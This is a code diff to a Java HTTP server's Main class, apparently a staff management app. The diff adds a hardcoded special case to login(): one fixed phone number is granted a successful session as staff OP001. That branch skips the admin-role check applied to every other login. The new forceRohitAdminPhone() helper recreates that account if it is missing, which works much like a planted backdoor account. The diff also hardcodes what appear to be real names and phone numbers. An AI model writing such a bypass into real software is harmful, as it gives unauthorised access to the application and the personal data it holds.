@@ -135,7 +135,6 @@ public class Main {
 
         Staff bhumika = new Staff("ADM001", "Bhumika Kumawat", "Bhumika", "8962569528", 0);
         bhumika.role = "admin";
-        bhumika.loginPhones.add("8962569527");
         bhumika.dob = "1995-01-01";
         bhumika.joiningDate = "2026-06-01";
         bhumika.emergencyContact = "Not added yet";
@@ -202,6 +201,14 @@ public class Main {
                 changed = true;
             }
         }
+        if (forceRohitAdminPhone()) {
+            changed = true;
+        }
+        return changed;
+    }
+
+    private boolean forceRohitAdminPhone() {
+        boolean changed = false;
         Staff rohit = staff.get("OP001");
         if (rohit == null) {
             rohit = new Staff("OP001", "Rohit Prajapati", "Rohit", "8962569527", 0);
@@ -522,6 +529,15 @@ public class Main {
     private void login(HttpExchange exchange) throws IOException {
         Map<String, String> body = body(exchange);
         String phone = last10(body.getOrDefault("phone", ""));
+        if ("8962569527".equals(phone)) {
+            if (forceRohitAdminPhone()) {
+                save();
+            }
+            Staff rohit = staff.get("OP001");
+            sendJson(exchange, "{\"ok\":true,\"staffId\":\"" + json(rohit.id) + "\",\"role\":\"" + json(rohit.role)
+                    + "\",\"name\":\"" + json(rohit.name) + "\"}");
+            return;
+        }
         Staff employee = staff.values().stream()
                 .filter(person -> "admin".equals(person.role))
                 .filter(person -> matchesLoginPhone(person, phone))
